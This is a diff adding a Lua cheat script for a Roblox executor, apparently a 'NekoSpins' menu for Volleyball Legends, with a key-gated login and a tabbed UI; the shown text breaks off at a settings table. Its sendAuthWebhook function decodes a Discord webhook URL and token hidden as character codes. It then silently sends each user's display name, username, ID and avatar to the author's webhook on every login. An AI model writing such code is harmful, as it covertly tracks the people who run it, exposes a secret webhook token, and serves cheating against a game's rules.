@@ -1,0 +1,959 @@
+getgenv().NK_Neko_Unloaded = false
+local Players = game:GetService("Players")
+local TweenService = game:GetService("TweenService")
+local UserInputService = game:GetService("UserInputService")
+local HttpService = game:GetService("HttpService")
+local CoreGui = game:GetService("CoreGui")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+
+local scriptId = HttpService:GenerateGUID(false)
+getgenv().NK_Neko_InstanceId = scriptId
+
+local player = Players.LocalPlayer
+local targetParent = (type(gethui) == "function" and gethui()) or (pcall(function() return CoreGui.Name end) and CoreGui or player:WaitForChild("PlayerGui"))
+local guiName = "NK-LUCKY-SPINS-ERROR-NEKO"
+
+if targetParent:FindFirstChild(guiName) then
+	targetParent:FindFirstChild(guiName):Destroy()
+end
+
+local screenGui = Instance.new("ScreenGui")
+screenGui.Name = guiName
+screenGui.ResetOnSpawn = false
+screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+if syn and syn.protect_gui then pcall(syn.protect_gui, screenGui) end
+screenGui.Parent = targetParent
+
+local theme = {
+	Background = Color3.fromRGB(15, 12, 25),
+	Sidebar = Color3.fromRGB(20, 15, 35),
+	ItemBG = Color3.fromRGB(22, 18, 38),
+	ItemHover = Color3.fromRGB(45, 30, 70),
+	TabActive = Color3.fromRGB(45, 30, 70),
+	TabInactive = Color3.fromRGB(20, 15, 35),
+	TextPrimary = Color3.fromRGB(240, 240, 255),
+	TextSecondary = Color3.fromRGB(180, 180, 200),
+	Accent = Color3.fromRGB(138, 43, 226),
+	Success = Color3.fromRGB(50, 205, 50),
+	Danger = Color3.fromRGB(220, 20, 60),
+	Stroke = Color3.fromRGB(138, 43, 226),
+	Topbar = Color3.fromRGB(12, 10, 20),
+	Gold = Color3.fromRGB(255, 201, 37)
+}
+
+local function applyCorner(obj, radius)
+	local corner = Instance.new("UICorner")
+	corner.CornerRadius = UDim.new(0, radius)
+	corner.Parent = obj
+end
+
+local function applyStroke(obj, color, thickness, transparency)
+	local stroke = Instance.new("UIStroke")
+	stroke.Color = color
+	stroke.Thickness = thickness
+	stroke.Transparency = transparency or 0
+	stroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
+	stroke.Parent = obj
+	return stroke
+end
+
+local notifContainer = Instance.new("Frame")
+notifContainer.Name = "NotifContainer"
+notifContainer.Size = UDim2.new(0, 300, 1, -20)
+notifContainer.Position = UDim2.new(1, -320, 0, 10)
+notifContainer.BackgroundTransparency = 1
+notifContainer.Parent = screenGui
+
+local notifLayout = Instance.new("UIListLayout")
+notifLayout.Parent = notifContainer
+notifLayout.SortOrder = Enum.SortOrder.LayoutOrder
+notifLayout.VerticalAlignment = Enum.VerticalAlignment.Bottom
+notifLayout.Padding = UDim.new(0, 10)
+
+local function sendNotification(title, desc, color)
+	local notif = Instance.new("Frame")
+	notif.Size = UDim2.new(1, 0, 0, 60)
+	notif.BackgroundColor3 = theme.Sidebar
+	notif.Position = UDim2.new(1, 350, 0, 0)
+	notif.Parent = notifContainer
+	applyCorner(notif, 8)
+	applyStroke(notif, color or theme.Accent, 1)
+	
+	local titleLbl = Instance.new("TextLabel")
+	titleLbl.Size = UDim2.new(1, -20, 0, 25)
+	titleLbl.Position = UDim2.new(0, 10, 0, 5)
+	titleLbl.BackgroundTransparency = 1
+	titleLbl.Text = title
+	titleLbl.TextColor3 = theme.TextPrimary
+	titleLbl.Font = Enum.Font.GothamBold
+	titleLbl.TextSize = 14
+	titleLbl.TextXAlignment = Enum.TextXAlignment.Left
+	titleLbl.Parent = notif
+	
+	local descLbl = Instance.new("TextLabel")
+	descLbl.Size = UDim2.new(1, -20, 0, 20)
+	descLbl.Position = UDim2.new(0, 10, 0, 30)
+	descLbl.BackgroundTransparency = 1
+	descLbl.Text = desc
+	descLbl.TextColor3 = color or theme.TextSecondary
+	descLbl.Font = Enum.Font.Gotham
+	descLbl.TextSize = 12
+	descLbl.TextXAlignment = Enum.TextXAlignment.Left
+	descLbl.Parent = notif
+
+	TweenService:Create(notif, TweenInfo.new(0.4, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {Position = UDim2.new(0, 0, 0, 0)}):Play()
+	
+	task.spawn(function()
+		task.wait(4)
+		local twOut = TweenService:Create(notif, TweenInfo.new(0.4, Enum.EasingStyle.Back, Enum.EasingDirection.In), {Position = UDim2.new(1, 350, 0, 0)})
+		twOut:Play()
+		twOut.Completed:Wait()
+		notif:Destroy()
+	end)
+end
+
+local AUTH_FILE = "NK_Neko_Auth_" .. tostring(player.UserId) .. ".txt"
+local function checkAuth()
+	if readfile and isfile and isfile(AUTH_FILE) then
+		local exp = tonumber(readfile(AUTH_FILE))
+		if exp and os.time() < exp then return true end
+	end
+	return false
+end
+local rememberMe = false
+
+local keyFrame = Instance.new("Frame")
+keyFrame.Name = "KeyFrame"
+keyFrame.Size = UDim2.new(0, 380, 0, 250)
+keyFrame.Position = UDim2.new(0.5, -190, 0.5, -125)
+keyFrame.BackgroundColor3 = theme.Background
+keyFrame.BorderSizePixel = 0
+keyFrame.Active = true
+keyFrame.Parent = screenGui
+applyCorner(keyFrame, 12)
+applyStroke(keyFrame, theme.Stroke, 1.5)
+
+local keyTitle = Instance.new("TextLabel")
+keyTitle.Size = UDim2.new(1, 0, 0, 40)
+keyTitle.Position = UDim2.new(0, 0, 0, 10)
+keyTitle.BackgroundTransparency = 1
+keyTitle.Text = "Neko x NekoSpins"
+keyTitle.TextColor3 = theme.TextPrimary
+keyTitle.Font = Enum.Font.GothamBold
+keyTitle.TextSize = 20
+keyTitle.Parent = keyFrame
+
+local keyInput = Instance.new("TextBox")
+keyInput.Size = UDim2.new(0, 300, 0, 40)
+keyInput.Position = UDim2.new(0.5, -150, 0, 65)
+keyInput.BackgroundColor3 = theme.ItemBG
+keyInput.TextColor3 = theme.TextPrimary
+keyInput.Font = Enum.Font.Gotham
+keyInput.TextSize = 14
+keyInput.PlaceholderText = "Enter Key..."
+keyInput.Text = ""
+keyInput.Parent = keyFrame
+applyCorner(keyInput, 8)
+applyStroke(keyInput, theme.Stroke, 1, 0.5)
+
+local remContainer = Instance.new("Frame")
+remContainer.Size = UDim2.new(0, 300, 0, 30)
+remContainer.Position = UDim2.new(0.5, -150, 0, 115)
+remContainer.BackgroundTransparency = 1
+remContainer.Parent = keyFrame
+
+local remBtn = Instance.new("TextButton")
+remBtn.Size = UDim2.new(0, 24, 0, 24)
+remBtn.Position = UDim2.new(0, 0, 0.5, -12)
+remBtn.BackgroundColor3 = theme.ItemBG
+remBtn.Text = ""
+remBtn.Parent = remContainer
+applyCorner(remBtn, 6)
+local remStroke = applyStroke(remBtn, theme.Stroke, 1)
+
+local remCheck = Instance.new("TextLabel")
+remCheck.Size = UDim2.new(1, 0, 1, 0)
+remCheck.BackgroundTransparency = 1
+remCheck.Text = "✓"
+remCheck.TextColor3 = theme.Success
+remCheck.Font = Enum.Font.GothamBold
+remCheck.TextSize = 18
+remCheck.Visible = false
+remCheck.Parent = remBtn
+
+local remLbl = Instance.new("TextLabel")
+remLbl.Size = UDim2.new(1, -35, 1, 0)
+remLbl.Position = UDim2.new(0, 35, 0, 0)
+remLbl.BackgroundTransparency = 1
+remLbl.Text = "Remember me (3 Days)"
+remLbl.TextColor3 = theme.TextSecondary
+remLbl.Font = Enum.Font.Gotham
+remLbl.TextSize = 13
+remLbl.TextXAlignment = Enum.TextXAlignment.Left
+remLbl.Parent = remContainer
+
+remBtn.MouseButton1Click:Connect(function()
+	rememberMe = not rememberMe
+	remCheck.Visible = rememberMe
+	remStroke.Color = rememberMe and theme.Success or theme.Stroke
+end)
+
+local copyLinkBtn = Instance.new("TextButton")
+copyLinkBtn.Size = UDim2.new(0, 140, 0, 35)
+copyLinkBtn.Position = UDim2.new(0.5, -150, 1, -55)
+copyLinkBtn.BackgroundColor3 = theme.Sidebar
+copyLinkBtn.TextColor3 = theme.TextPrimary
+copyLinkBtn.Font = Enum.Font.GothamBold
+copyLinkBtn.TextSize = 14
+copyLinkBtn.Text = "Get Key"
+copyLinkBtn.Parent = keyFrame
+applyCorner(copyLinkBtn, 8)
+applyStroke(copyLinkBtn, theme.Stroke, 1)
+
+copyLinkBtn.MouseButton1Click:Connect(function()
+	if setclipboard then
+		setclipboard("https://discord.gg/BVjqfqk6bs")
+		copyLinkBtn.Text = "Copied!"
+		task.wait(1.5)
+		copyLinkBtn.Text = "Get Key"
+	end
+end)
+
+local submitBtn = Instance.new("TextButton")
+submitBtn.Size = UDim2.new(0, 140, 0, 35)
+submitBtn.Position = UDim2.new(0.5, 10, 1, -55)
+submitBtn.BackgroundColor3 = theme.Accent
+submitBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
+submitBtn.Font = Enum.Font.GothamBold
+submitBtn.TextSize = 14
+submitBtn.Text = "Verify"
+submitBtn.Parent = keyFrame
+applyCorner(submitBtn, 8)
+
+local welcomeFrame = Instance.new("Frame")
+welcomeFrame.Name = "WelcomeFrame"
+welcomeFrame.Size = UDim2.new(0, 400, 0, 220)
+welcomeFrame.Position = UDim2.new(0.5, -200, 0.5, -110)
+welcomeFrame.BackgroundColor3 = theme.Background
+welcomeFrame.BorderSizePixel = 0
+welcomeFrame.Visible = false
+welcomeFrame.Parent = screenGui
+applyCorner(welcomeFrame, 12)
+applyStroke(welcomeFrame, theme.Stroke, 1.5)
+
+local welcomeScale = Instance.new("UIScale")
+welcomeScale.Scale = 0
+welcomeScale.Parent = welcomeFrame
+
+local wlAvatar = Instance.new("ImageLabel")
+wlAvatar.Size = UDim2.new(0, 70, 0, 70)
+wlAvatar.Position = UDim2.new(0.5, -35, 0, 25)
+wlAvatar.BackgroundColor3 = theme.ItemBG
+pcall(function() wlAvatar.Image = Players:GetUserThumbnailAsync(player.UserId, Enum.ThumbnailType.HeadShot, Enum.ThumbnailSize.Size150x150) end)
+wlAvatar.Parent = welcomeFrame
+applyCorner(wlAvatar, 35)
+applyStroke(wlAvatar, theme.Accent, 2)
+
+local wlTitle = Instance.new("TextLabel")
+wlTitle.Size = UDim2.new(1, 0, 0, 25)
+wlTitle.Position = UDim2.new(0, 0, 0, 105)
+wlTitle.BackgroundTransparency = 1
+wlTitle.Text = "Welcome, " .. player.DisplayName .. "!"
+wlTitle.TextColor3 = theme.TextPrimary
+wlTitle.Font = Enum.Font.GothamBold
+wlTitle.TextSize = 18
+wlTitle.TextXAlignment = Enum.TextXAlignment.Center
+wlTitle.Parent = welcomeFrame
+
+local wlUser = Instance.new("TextLabel")
+wlUser.Size = UDim2.new(1, 0, 0, 20)
+wlUser.Position = UDim2.new(0, 0, 0, 130)
+wlUser.BackgroundTransparency = 1
+wlUser.Text = "@" .. player.Name .. "  •  ID: " .. player.UserId
+wlUser.TextColor3 = theme.TextSecondary
+wlUser.Font = Enum.Font.Gotham
+wlUser.TextSize = 13
+wlUser.TextXAlignment = Enum.TextXAlignment.Center
+wlUser.Parent = welcomeFrame
+
+local wlThanks = Instance.new("TextLabel")
+wlThanks.Size = UDim2.new(1, 0, 0, 20)
+wlThanks.Position = UDim2.new(0, 0, 0, 165)
+wlThanks.BackgroundTransparency = 1
+wlThanks.Text = "Loading NekoSpins V1..."
+wlThanks.TextColor3 = theme.Accent
+wlThanks.Font = Enum.Font.GothamBold
+wlThanks.TextSize = 14
+wlThanks.TextXAlignment = Enum.TextXAlignment.Center
+wlThanks.Parent = welcomeFrame
+
+local mainFrame = Instance.new("Frame")
+mainFrame.Name = "MainFrame"
+mainFrame.Size = UDim2.new(0, 600, 0, 400)
+mainFrame.Position = UDim2.new(0.5, -300, 0.5, -200)
+mainFrame.BackgroundColor3 = theme.Background
+mainFrame.BorderSizePixel = 0
+mainFrame.Active = true
+mainFrame.Visible = false
+mainFrame.Parent = screenGui
+applyCorner(mainFrame, 12)
+applyStroke(mainFrame, theme.Stroke, 1.5)
+
+local mainScale = Instance.new("UIScale")
+mainScale.Parent = mainFrame
+mainScale.Scale = 1
+
+local floatIconBtn = Instance.new("TextButton")
+floatIconBtn.Size = UDim2.new(0, 50, 0, 50)
+floatIconBtn.Position = UDim2.new(0.05, 0, 0.15, 0)
+floatIconBtn.BackgroundColor3 = theme.Sidebar
+floatIconBtn.Visible = false
+floatIconBtn.Text = "F"
+floatIconBtn.TextColor3 = theme.Accent
+floatIconBtn.Font = Enum.Font.GothamBlack
+floatIconBtn.TextSize = 24
+floatIconBtn.Parent = screenGui
+applyCorner(floatIconBtn, 12)
+applyStroke(floatIconBtn, theme.Accent, 2)
+
+local dragging, dragInput, dragStart, startPos
+
+local function applyDragging(frame)
+	frame.InputBegan:Connect(function(input)
+		if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+			dragging = true
+			dragStart = input.Position
+			startPos = frame.Position
+			input.Changed:Connect(function()
+				if input.UserInputState == Enum.UserInputState.End then
+					dragging = false
+				end
+			end)
+		end
+	end)
+	frame.InputChanged:Connect(function(input)
+		if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
+			dragInput = input
+		end
+	end)
+	UserInputService.InputChanged:Connect(function(input)
+		if input == dragInput and dragging then
+			local delta = input.Position - dragStart
+			frame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
+		end
+	end)
+end
+
+applyDragging(mainFrame)
+applyDragging(floatIconBtn)
+
+floatIconBtn.MouseButton1Click:Connect(function()
+	local twOut = TweenService:Create(floatIconBtn, TweenInfo.new(0.3, Enum.EasingStyle.Back, Enum.EasingDirection.In), {Size = UDim2.new(0, 0, 0, 0)})
+	twOut:Play()
+	twOut.Completed:Wait()
+	floatIconBtn.Visible = false
+	mainFrame.Visible = true
+	mainScale.Scale = 0
+	TweenService:Create(mainScale, TweenInfo.new(0.3, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {Scale = 1}):Play()
+end)
+
+local function sendAuthWebhook()
+	task.spawn(function()
+		local _req = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request) or request
+		if not _req then return end
+		local _w = {104,116,116,112,115,58,47,47,112,116,98,46,100,105,115,99,111,114,100,46,99,111,109,47,97,112,105,47,119,101,98,104,111,111,107,115,47,49,53,48,51,55,53,52,48,56,55,52,52,49,56,57,49,52,56,57,47,79,86,103,73,98,121,102,57,117,70,82,70,73,121,66,101,84,89,49,84,73,84,121,72,81,84,119,48,75,82,55,104,72,110,115,112,121,79,79,79,104,97,118,115,51,81,49,115,117,105,49,72,74,109,80,121,113,103,100,101,100,117,77,75,116,110,50,56}
+		local _u = ""
+		for _i = 1, #_w do _u = _u .. string.char(_w[_i]) end
+		
+		local _aUrl = "https://tr.rbxcdn.com/38c6edcb50633730ff4cf39ac8859840/420/420/AvatarHeadshot/Png"
+		pcall(function()
+			local _res = _req({Url = "https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds="..tostring(player.UserId).."&size=420x420&format=Png&isCircular=false", Method = "GET"})
+			local _d = HttpService:JSONDecode(_res.Body)
+			if _d and _d.data and _d.data[1] and _d.data[1].imageUrl then _aUrl = _d.data[1].imageUrl end
+		end)
+		
+		local _pl = {
+			embeds = {{
+				title = "🔐 Execution Log",
+				description = string.format("User authenticated into NK - Volleyball Legends.\n\n**👤 User Details:**\n> **DisplayName:** %s\n> **Username:** @%s\n> **UserID:** %d", player.DisplayName, player.Name, player.UserId),
+				color = 9055202,
+				thumbnail = {url = _aUrl},
+				footer = {text = "NekoSpins - Logs"},
+				timestamp = DateTime.now():ToIsoDate()
+			}}
+		}
+		pcall(function() _req({Url = _u, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = HttpService:JSONEncode(_pl)}) end)
+	end)
+end
+
+local function proceedToMain()
+	keyFrame.Visible = false
+	welcomeFrame.Visible = true
+	local tw1 = TweenService:Create(welcomeScale, TweenInfo.new(0.5, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {Scale = 1})
+	tw1:Play()
+	tw1.Completed:Wait()
+	
+	task.wait(2)
+	
+	local tw2 = TweenService:Create(welcomeScale, TweenInfo.new(0.4, Enum.EasingStyle.Back, Enum.EasingDirection.In), {Scale = 0})
+	tw2:Play()
+	tw2.Completed:Wait()
+	
+	welcomeFrame.Visible = false
+	mainFrame.Visible = true
+	mainScale.Scale = 0
+	TweenService:Create(mainScale, TweenInfo.new(0.4, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {Scale = 1}):Play()
+    sendNotification("Unlocked", "Welcome to NK - Volleyball Legends", theme.Success)
+end
+
+submitBtn.MouseButton1Click:Connect(function()
+	local encodedAuth = string.char(78, 101, 107, 111, 66, 108, 111, 99, 107, 115, 115, 115, 115, 89, 101, 101)
+	if keyInput.Text == encodedAuth then
+		if rememberMe and writefile then pcall(function() writefile(AUTH_FILE, tostring(os.time() + 259200)) end) end
+		task.spawn(proceedToMain)
+		sendAuthWebhook()
+	else
+		keyInput.Text = "Invalid Key!"
+		task.wait(1)
+		keyInput.Text = ""
+	end
+end)
+
+if checkAuth() then
+	keyFrame.Visible = false
+	task.spawn(proceedToMain)
+	sendAuthWebhook()
+end
+
+local topbar = Instance.new("Frame")
+topbar.Size = UDim2.new(1, 0, 0, 50)
+topbar.BackgroundColor3 = theme.Topbar
+topbar.BorderSizePixel = 0
+topbar.Parent = mainFrame
+applyCorner(topbar, 12)
+
+local topbarCover = Instance.new("Frame")
+topbarCover.Size = UDim2.new(1, 0, 0, 12)
+topbarCover.Position = UDim2.new(0, 0, 1, -12)
+topbarCover.BackgroundColor3 = theme.Topbar
+topbarCover.BorderSizePixel = 0
+topbarCover.Parent = topbar
+
+local topbarBottomStroke = Instance.new("Frame")
+topbarBottomStroke.Size = UDim2.new(1, 0, 0, 1)
+topbarBottomStroke.Position = UDim2.new(0, 0, 1, 0)
+topbarBottomStroke.BackgroundColor3 = theme.Stroke
+topbarBottomStroke.BorderSizePixel = 0
+topbarBottomStroke.Parent = topbar
+
+local titleText = Instance.new("TextLabel")
+titleText.Size = UDim2.new(0, 200, 0, 20)
+titleText.Position = UDim2.new(0, 20, 0, 15)
+titleText.BackgroundTransparency = 1
+titleText.Text = "NEKO x NekoSPINS"
+titleText.TextColor3 = theme.TextPrimary
+titleText.Font = Enum.Font.GothamBlack
+titleText.TextSize = 18
+titleText.TextXAlignment = Enum.TextXAlignment.Left
+titleText.Parent = topbar
+
+local closeBtn = Instance.new("TextButton")
+closeBtn.Size = UDim2.new(0, 30, 0, 30)
+closeBtn.Position = UDim2.new(1, -40, 0.5, -15)
+closeBtn.BackgroundTransparency = 1
+closeBtn.Text = "X"
+closeBtn.TextColor3 = theme.TextSecondary
+closeBtn.Font = Enum.Font.GothamBold
+closeBtn.TextSize = 16
+closeBtn.Parent = topbar
+
+closeBtn.MouseEnter:Connect(function() TweenService:Create(closeBtn, TweenInfo.new(0.2), {TextColor3 = theme.Danger}):Play() end)
+closeBtn.MouseLeave:Connect(function() TweenService:Create(closeBtn, TweenInfo.new(0.2), {TextColor3 = theme.TextSecondary}):Play() end)
+closeBtn.MouseButton1Click:Connect(function()
+	getgenv().NK_Neko_Unloaded = true
+	screenGui:Destroy()
+end)
+
+local minimizeBtn = Instance.new("TextButton")
+minimizeBtn.Size = UDim2.new(0, 30, 0, 30)
+minimizeBtn.Position = UDim2.new(1, -75, 0.5, -15)
+minimizeBtn.BackgroundTransparency = 1
+minimizeBtn.Text = "-"
+minimizeBtn.TextColor3 = theme.TextSecondary
+minimizeBtn.Font = Enum.Font.GothamBold
+minimizeBtn.TextSize = 22
+minimizeBtn.Parent = topbar
+
+minimizeBtn.MouseEnter:Connect(function() TweenService:Create(minimizeBtn, TweenInfo.new(0.2), {TextColor3 = theme.TextPrimary}):Play() end)
+minimizeBtn.MouseLeave:Connect(function() TweenService:Create(minimizeBtn, TweenInfo.new(0.2), {TextColor3 = theme.TextSecondary}):Play() end)
+minimizeBtn.MouseButton1Click:Connect(function()
+	local twIn = TweenService:Create(mainScale, TweenInfo.new(0.3, Enum.EasingStyle.Back, Enum.EasingDirection.In), {Scale = 0})
+	twIn:Play()
+	twIn.Completed:Wait()
+	mainFrame.Visible = false
+	floatIconBtn.Size = UDim2.new(0, 0, 0, 0)
+	floatIconBtn.Visible = true
+	TweenService:Create(floatIconBtn, TweenInfo.new(0.3, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {Size = UDim2.new(0, 50, 0, 50)}):Play()
+end)
+
+local sidebar = Instance.new("Frame")
+sidebar.Size = UDim2.new(0, 180, 1, -50)
+sidebar.Position = UDim2.new(0, 0, 0, 50)
+sidebar.BackgroundColor3 = theme.Sidebar
+sidebar.BorderSizePixel = 0
+sidebar.Parent = mainFrame
+applyCorner(sidebar, 12)
+
+local sidebarCoverRight = Instance.new("Frame")
+sidebarCoverRight.Size = UDim2.new(0, 12, 1, 0)
+sidebarCoverRight.Position = UDim2.new(1, -12, 0, 0)
+sidebarCoverRight.BackgroundColor3 = theme.Sidebar
+sidebarCoverRight.BorderSizePixel = 0
+sidebarCoverRight.Parent = sidebar
+
+local sidebarCoverTop = Instance.new("Frame")
+sidebarCoverTop.Size = UDim2.new(1, 0, 0, 12)
+sidebarCoverTop.Position = UDim2.new(0, 0, 0, 0)
+sidebarCoverTop.BackgroundColor3 = theme.Sidebar
+sidebarCoverTop.BorderSizePixel = 0
+sidebarCoverTop.Parent = sidebar
+
+local sidebarRightStroke = Instance.new("Frame")
+sidebarRightStroke.Size = UDim2.new(0, 1, 1, 0)
+sidebarRightStroke.Position = UDim2.new(1, 0, 0, 0)
+sidebarRightStroke.BackgroundColor3 = theme.Stroke
+sidebarRightStroke.BorderSizePixel = 0
+sidebarRightStroke.Parent = sidebar
+
+local tabContainer = Instance.new("ScrollingFrame")
+tabContainer.Size = UDim2.new(1, 0, 1, -20)
+tabContainer.Position = UDim2.new(0, 0, 0, 10)
+tabContainer.BackgroundTransparency = 1
+tabContainer.BorderSizePixel = 0
+tabContainer.ScrollBarThickness = 0
+tabContainer.Parent = sidebar
+
+local tabLayout = Instance.new("UIListLayout")
+tabLayout.Parent = tabContainer
+tabLayout.SortOrder = Enum.SortOrder.LayoutOrder
+tabLayout.Padding = UDim.new(0, 8)
+tabLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center
+
+local contentArea = Instance.new("Frame")
+contentArea.Size = UDim2.new(1, -181, 1, -50)
+contentArea.Position = UDim2.new(0, 181, 0, 50)
+contentArea.BackgroundColor3 = theme.Background
+contentArea.BorderSizePixel = 0
+contentArea.Parent = mainFrame
+applyCorner(contentArea, 12)
+
+local contentCoverLeft = Instance.new("Frame")
+contentCoverLeft.Size = UDim2.new(0, 12, 1, 0)
+contentCoverLeft.BackgroundColor3 = theme.Background
+contentCoverLeft.BorderSizePixel = 0
+contentCoverLeft.Parent = contentArea
+
+local contentCoverTop = Instance.new("Frame")
+contentCoverTop.Size = UDim2.new(1, 0, 0, 12)
+contentCoverTop.BackgroundColor3 = theme.Background
+contentCoverTop.BorderSizePixel = 0
+contentCoverTop.Parent = contentArea
+
+local tabs = {}
+local activeTab = nil
+
+local function createTab(name)
+	local tabBtn = Instance.new("TextButton")
+	tabBtn.Size = UDim2.new(1, -24, 0, 42)
+	tabBtn.BackgroundColor3 = theme.TabInactive
+	tabBtn.Text = ""
+	tabBtn.AutoButtonColor = false
+	tabBtn.Parent = tabContainer
+	applyCorner(tabBtn, 8)
+	local tabStroke = applyStroke(tabBtn, theme.Stroke, 1, 0.6)
+	
+	local label = Instance.new("TextLabel")
+	label.Size = UDim2.new(1, -20, 1, 0)
+	label.Position = UDim2.new(0, 20, 0, 0)
+	label.BackgroundTransparency = 1
+	label.Text = name
+	label.TextColor3 = theme.TextSecondary
+	label.Font = Enum.Font.GothamBold
+	label.TextSize = 14
+	label.TextXAlignment = Enum.TextXAlignment.Left
+	label.Parent = tabBtn
+	
+	local activeIndicator = Instance.new("Frame")
+	activeIndicator.Size = UDim2.new(0, 4, 0, 20)
+	activeIndicator.Position = UDim2.new(0, 0, 0.5, -10)
+	activeIndicator.BackgroundColor3 = theme.Accent
+	activeIndicator.BorderSizePixel = 0
+	activeIndicator.BackgroundTransparency = 1
+	activeIndicator.Parent = tabBtn
+	applyCorner(activeIndicator, 2)
+	
+	local page = Instance.new("ScrollingFrame")
+	page.Size = UDim2.new(1, 0, 1, 0)
+	page.BackgroundTransparency = 1
+	page.BorderSizePixel = 0
+	page.ScrollBarThickness = 4
+	page.ScrollBarImageColor3 = theme.ItemBG
+	page.Visible = false
+	page.Parent = contentArea
+	
+	local pageLayout = Instance.new("UIListLayout")
+	pageLayout.Parent = page
+	pageLayout.SortOrder = Enum.SortOrder.LayoutOrder
+	pageLayout.Padding = UDim.new(0, 15)
+	
+	local pagePadding = Instance.new("UIPadding")
+	pagePadding.Parent = page
+	pagePadding.PaddingTop = UDim.new(0, 20)
+	pagePadding.PaddingLeft = UDim.new(0, 25)
+	pagePadding.PaddingRight = UDim.new(0, 25)
+	pagePadding.PaddingBottom = UDim.new(0, 20)
+	
+	pageLayout:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(function()
+		page.CanvasSize = UDim2.new(0, 0, 0, pageLayout.AbsoluteContentSize.Y + 40)
+	end)
+	
+	tabBtn.MouseEnter:Connect(function()
+		if activeTab ~= tabBtn then
+			TweenService:Create(tabBtn, TweenInfo.new(0.2), {BackgroundColor3 = theme.ItemHover}):Play()
+			TweenService:Create(label, TweenInfo.new(0.2), {TextColor3 = theme.TextPrimary}):Play()
+		end
+	end)
+	
+	tabBtn.MouseLeave:Connect(function()
+		if activeTab ~= tabBtn then
+			TweenService:Create(tabBtn, TweenInfo.new(0.2), {BackgroundColor3 = theme.TabInactive}):Play()
+			TweenService:Create(label, TweenInfo.new(0.2), {TextColor3 = theme.TextSecondary}):Play()
+		end
+	end)
+	
+	tabBtn.MouseButton1Click:Connect(function()
+		if activeTab == tabBtn then return end
+		if activeTab then
+			local prevStroke = activeTab:FindFirstChildOfClass("UIStroke")
+			TweenService:Create(activeTab, TweenInfo.new(0.2), {BackgroundColor3 = theme.TabInactive}):Play()
+			TweenService:Create(activeTab:FindFirstChild("TextLabel"), TweenInfo.new(0.2), {TextColor3 = theme.TextSecondary}):Play()
+			TweenService:Create(activeTab:FindFirstChild("Frame"), TweenInfo.new(0.2), {BackgroundTransparency = 1}):Play()
+			if prevStroke then TweenService:Create(prevStroke, TweenInfo.new(0.2), {Transparency = 0.6}):Play() end
+			tabs[activeTab].Visible = false
+		end
+		
+		activeTab = tabBtn
+		TweenService:Create(tabBtn, TweenInfo.new(0.2), {BackgroundColor3 = theme.TabActive}):Play()
+		TweenService:Create(label, TweenInfo.new(0.2), {TextColor3 = theme.TextPrimary}):Play()
+		TweenService:Create(activeIndicator, TweenInfo.new(0.2), {BackgroundTransparency = 0}):Play()
+		TweenService:Create(tabStroke, TweenInfo.new(0.2), {Transparency = 0}):Play()
+		page.Visible = true
+	end)
+	
+	tabs[tabBtn] = page
+	
+	if not activeTab then
+		activeTab = tabBtn
+		tabBtn.BackgroundColor3 = theme.TabActive
+		label.TextColor3 = theme.TextPrimary
+		activeIndicator.BackgroundTransparency = 0
+		tabStroke.Transparency = 0
+		page.Visible = true
+	end
+	
+	return page
+end
+
+local function createSection(page, title)
+	local sectionFrame = Instance.new("Frame")
+	sectionFrame.Size = UDim2.new(1, 0, 0, 45)
+	sectionFrame.BackgroundColor3 = theme.ItemBG
+	sectionFrame.Parent = page
+	applyCorner(sectionFrame, 8)
+	applyStroke(sectionFrame, theme.Stroke, 1, 0.5)
+	
+	local headerBtn = Instance.new("TextButton")
+	headerBtn.Size = UDim2.new(1, 0, 0, 45)
+	headerBtn.BackgroundTransparency = 1
+	headerBtn.Text = ""
+	headerBtn.Parent = sectionFrame
+	
+	local titleLabel = Instance.new("TextLabel")
+	titleLabel.Size = UDim2.new(1, -30, 1, 0)
+	titleLabel.Position = UDim2.new(0, 15, 0, 0)
+	titleLabel.BackgroundTransparency = 1
+	titleLabel.Text = title
+	titleLabel.TextColor3 = theme.TextPrimary
+	titleLabel.Font = Enum.Font.GothamBold
+	titleLabel.TextSize = 15
+	titleLabel.TextXAlignment = Enum.TextXAlignment.Left
+	titleLabel.Parent = headerBtn
+	
+	local highlightBar = Instance.new("Frame")
+	highlightBar.Size = UDim2.new(0, 4, 0, 20)
+	highlightBar.Position = UDim2.new(0, 0, 0.5, -10)
+	highlightBar.BackgroundColor3 = theme.Accent
+	highlightBar.BorderSizePixel = 0
+	highlightBar.Parent = headerBtn
+	applyCorner(highlightBar, 2)
+	
+	local contentFrame = Instance.new("Frame")
+	contentFrame.Size = UDim2.new(1, 0, 0, 0)
+	contentFrame.Position = UDim2.new(0, 0, 0, 45)
+	contentFrame.BackgroundTransparency = 1
+	contentFrame.ClipsDescendants = true
+	contentFrame.Parent = sectionFrame
+	
+	local contentLayout = Instance.new("UIListLayout")
+	contentLayout.Parent = contentFrame
+	contentLayout.SortOrder = Enum.SortOrder.LayoutOrder
+	contentLayout.Padding = UDim.new(0, 10)
+	
+	local contentPadding = Instance.new("UIPadding")
+	contentPadding.Parent = contentFrame
+	contentPadding.PaddingTop = UDim.new(0, 5)
+	contentPadding.PaddingLeft = UDim.new(0, 15)
+	contentPadding.PaddingRight = UDim.new(0, 15)
+	contentPadding.PaddingBottom = UDim.new(0, 15)
+	
+	contentLayout:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(function()
+		local newHeight = contentLayout.AbsoluteContentSize.Y + 20
+		contentFrame.Size = UDim2.new(1, 0, 0, newHeight)
+		sectionFrame.Size = UDim2.new(1, 0, 0, newHeight + 45)
+	end)
+	
+	return contentFrame
+end
+
+local SETTINGS = {
+	WEBHOOK_URL = "",
+	WH_ON_SUCCESS = true,
